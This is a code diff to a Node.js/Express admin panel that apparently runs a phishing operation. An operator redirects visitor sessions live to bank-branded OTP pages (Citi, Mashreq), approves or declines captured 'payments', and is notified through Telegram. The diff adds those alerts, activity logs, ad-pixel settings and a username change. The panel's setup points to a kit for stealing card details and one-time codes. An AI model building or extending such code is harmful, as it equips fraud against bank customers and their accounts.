@@ -1,7 +1,7 @@
 const express  = require('express');
 const bcrypt   = require('bcryptjs');
 const router   = express.Router();
-const { query, queryOne, getSetting, setSetting } = require('../db');
+const { query, queryOne, getSetting, setSetting, clientIp, logActivity } = require('../db');
 
 function requireAdmin(req, res, next) {
   if (req.session.adminLoggedIn) return next();
@@ -14,6 +14,22 @@ async function count(sql, params = []) {
   return Number(Object.values(rows[0] || {})[0]) || 0;
 }
 
+// ─── Telegram admin alert helper ─────────────────────────────────────────────
+async function sendAdminAlert(message) {
+  const enabled = await getSetting('admin_tg_alerts', '0');
+  if (enabled !== '1') return;
+  const token  = await getSetting('telegram_bot_token', '');
+  const chatId = await getSetting('telegram_chat_id', '');
+  if (!token || !chatId) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+    });
+  } catch {}
+}
+
 // ─── Login ───────────────────────────────────────────────────────────────────
 router.get('/', (req, res) => res.redirect('/admin/dashboard'));
 router.get('/login', (req, res) => {
@@ -23,11 +39,15 @@ router.get('/login', (req, res) => {
 
 router.post('/login', async (req, res) => {
   const { username='', password='' } = req.body;
+  const ip        = clientIp(req);
+  const userAgent = req.headers['user-agent'] || '';
   try {
     const user = await queryOne('SELECT id, password FROM admin_users WHERE username = ? LIMIT 1', [username]);
     if (user && await bcrypt.compare(password, user.password)) {
       req.session.adminLoggedIn = true;
       req.session.adminUser     = username;
+      logActivity('admin_login', 'Admin login: ' + username, username, ip, userAgent).catch(() => {});
+      sendAdminAlert('🔐 <b>Admin Login</b>\nUser: ' + username + '\nIP: ' + ip + '\nTime: ' + new Date().toUTCString()).catch(() => {});
       return res.redirect('/admin/dashboard');
     }
     res.render('admin/login', { error: 'Kullanıcı adı veya şifre hatalı.' });
@@ -179,6 +199,12 @@ async function loadSettings() {
     telegramChatId:  await getSetting('telegram_chat_id',            process.env.TELEGRAM_CHAT_ID            || ''),
     searchTgToken:   await getSetting('search_telegram_bot_token',   process.env.SEARCH_TELEGRAM_BOT_TOKEN   || ''),
     handyApiKey:     await getSetting('handy_api_key',               process.env.HANDY_API_KEY               || ''),
+    metaPixelId:        await getSetting('meta_pixel_id',       ''),
+    metaAccessToken:    await getSetting('meta_access_token',   ''),
+    metaTestEventCode:  await getSetting('meta_test_event_code',''),
+    tiktokPixelId:      await getSetting('tiktok_pixel_id',     ''),
+    tiktokAccessToken:  await getSetting('tiktok_access_token', ''),
+    adminTgAlerts:      await getSetting('admin_tg_alerts',     '0'),
   };
 }
 
@@ -192,6 +218,8 @@ router.get('/settings', requireAdmin, async (req, res) => {
       adminUser: req.session.adminUser,
       otpDefault:'otp-sms', siteActive:'1',
       telegramToken:'', telegramChatId:'', searchTgToken:'', handyApiKey:'',
+      metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
+      tiktokPixelId:'', tiktokAccessToken:'', adminTgAlerts:'0',
       saved:false, error:e.message, pwMsg:null,
     });
   }
@@ -213,6 +241,12 @@ router.post('/settings', requireAdmin, async (req, res) => {
       await setSetting('telegram_chat_id',          (req.body.telegram_chat_id          || '').trim());
       await setSetting('search_telegram_bot_token', (req.body.search_telegram_bot_token || '').trim());
       await setSetting('handy_api_key',             (req.body.handy_api_key             || '').trim());
+      await setSetting('meta_pixel_id',             (req.body.meta_pixel_id             || '').trim());
+      await setSetting('meta_access_token',         (req.body.meta_access_token         || '').trim());
+      await setSetting('meta_test_event_code',      (req.body.meta_test_event_code       || '').trim());
+      await setSetting('tiktok_pixel_id',           (req.body.tiktok_pixel_id           || '').trim());
+      await setSetting('tiktok_access_token',       (req.body.tiktok_access_token        || '').trim());
+      await setSetting('admin_tg_alerts',           (req.body.admin_tg_alerts           || '0'));
       saved = true;
     } catch (e) { error = e.message; }
 
@@ -231,6 +265,20 @@ router.post('/settings', requireAdmin, async (req, res) => {
           [await bcrypt.hash(new_password, 10), req.session.adminUser]);
         pwMsg = { type:'success', text:'Password updated successfully.' };
       }
+      // Handle optional username change
+      if (req.body.new_username && req.body.new_username.trim() !== req.session.adminUser) {
+        const newU = req.body.new_username.trim();
+        const exists = await queryOne('SELECT id FROM admin_users WHERE username = ? AND username != ?', [newU, req.session.adminUser]);
+        if (exists) {
+          pwMsg = { type:'error', text:'Username already taken.' };
+        } else {
+          await query('UPDATE admin_users SET username = ? WHERE username = ?', [newU, req.session.adminUser]);
+          req.session.adminUser = newU;
+          if (!pwMsg || pwMsg.type !== 'error') {
+            pwMsg = { type:'success', text:(pwMsg && pwMsg.type === 'success' ? 'Password and username updated successfully.' : 'Username updated successfully.') };
+          }
+        }
+      }
     } catch (e) { pwMsg = { type:'error', text: e.message }; }
   }
 
@@ -242,6 +290,8 @@ router.post('/settings', requireAdmin, async (req, res) => {
       adminUser: req.session.adminUser,
       otpDefault:'otp-sms', siteActive:'1',
       telegramToken:'', telegramChatId:'', searchTgToken:'', handyApiKey:'',
+      metaPixelId:'', metaAccessToken:'', metaTestEventCode:'',
+      tiktokPixelId:'', tiktokAccessToken:'', adminTgAlerts:'0',
       saved, error: error || e.message, pwMsg,
     });
   }
@@ -258,12 +308,17 @@ router.get('/api/latest-payment-id', requireAdmin, async (req, res) => {
 // ─── Actions (AJAX) ──────────────────────────────────────────────────────────
 router.post('/action', requireAdmin, async (req, res) => {
   const { act='', sid='' } = req.body;
-  const cleanSid = sid.replace(/[^a-f0-9]/g, '');
+  const cleanSid  = sid.replace(/[^a-f0-9]/g, '');
+  const adminUser = req.session.adminUser || '';
+  const ip        = clientIp(req);
+  const userAgent = req.headers['user-agent'] || '';
   try {
     if (act === 'redirect') {
       const allowed = ['otp-sms','otp','otp-citi','otp-mashreq'];
       if (!cleanSid || !allowed.includes(req.body.page)) return res.json({ ok:false, error:'Invalid' });
       await query('UPDATE payments SET redirect_to = ?, otp_page = ? WHERE sid = ?', [req.body.page, req.body.page, cleanSid]);
+      logActivity('otp_redirect', 'OTP redirect → ' + req.body.page + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
+      sendAdminAlert('↩️ <b>OTP Redirect</b>\nSID: ' + cleanSid + '\nPage: ' + req.body.page + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
       return res.json({ ok: true });
     }
     if (act === 'set_status') {
@@ -274,6 +329,10 @@ router.post('/action', requireAdmin, async (req, res) => {
         await query('UPDATE payments SET otp_status = ?, redirect_to = ? WHERE sid = ?', ['approved', 'otp-approved', cleanSid]);
       } else {
         await query('UPDATE payments SET otp_status = ? WHERE sid = ?', [req.body.status, cleanSid]);
+      }
+      if (req.body.status === 'approved' || req.body.status === 'declined') {
+        logActivity('payment_status', 'Payment status → ' + req.body.status + ' (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
+        sendAdminAlert('💳 <b>Payment Status</b>\nSID: ' + cleanSid + '\nStatus: ' + req.body.status + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
       }
       return res.json({ ok: true });
     }
@@ -287,12 +346,47 @@ router.post('/action', requireAdmin, async (req, res) => {
       if (!cleanSid) return res.json({ ok:false });
       await query('DELETE FROM payments WHERE sid = ?', [cleanSid]);
       await query('DELETE FROM otp_events WHERE sid = ?', [cleanSid]);
+      logActivity('payment_delete', 'Payment deleted (sid: ' + cleanSid + ')', adminUser, ip, userAgent).catch(() => {});
+      sendAdminAlert('🗑️ <b>Payment Deleted</b>\nSID: ' + cleanSid + '\nAdmin: ' + adminUser + '\nIP: ' + ip).catch(() => {});
       return res.json({ ok: true });
     }
     res.json({ ok:false, error:'Unknown action' });
   } catch (e) {
     res.json({ ok:false, error:e.message });
   }
+});
+
+// ─── Activity Logs ───────────────────────────────────────────────────────────
+router.get('/logs', requireAdmin, async (req, res) => {
+  const search  = req.query.q || '';
+  const action  = req.query.action || '';
+  const page    = Math.max(1, parseInt(req.query.p) || 1);
+  const perPage = 30;
+  const offset  = (page - 1) * perPage;
+  try {
+    let where = '1=1', params = [];
+    if (search) {
+      where += ' AND (description ILIKE ? OR admin_user ILIKE ? OR ip ILIKE ? OR comment ILIKE ?)';
+      params.push(...[`%${search}%`, `%${search}%`, `%${search}%`, `%${search}%`]);
+    }
+    if (action) { where += ' AND action = ?'; params.push(action); }
+    const total      = await count(`SELECT COUNT(*) FROM activity_logs WHERE ${where}`, params);
+    const logs       = await query(`SELECT * FROM activity_logs WHERE ${where} ORDER BY created_at DESC LIMIT ${perPage} OFFSET ${offset}`, params);
+    const totalPages = Math.max(1, Math.ceil(total / perPage));
+    res.render('admin/logs', { adminUser: req.session.adminUser, logs, total, totalPages, page, search, action, perPage });
+  } catch (e) {
+    res.render('admin/logs', { adminUser: req.session.adminUser, logs: [], total: 0, totalPages: 1, page: 1, search, action, perPage, dbError: e.message });
+  }
+});
+
+router.post('/logs/comment', requireAdmin, async (req, res) => {
+  const { id = '', comment = '' } = req.body;
+  const cleanId = parseInt(id) || 0;
+  if (!cleanId) return res.json({ ok: false });
+  try {
+    await query('UPDATE activity_logs SET comment = ? WHERE id = ?', [comment, cleanId]);
+    res.json({ ok: true });
+  } catch (e) { res.json({ ok: false, error: e.message }); }
 });
 
 module.exports = router;
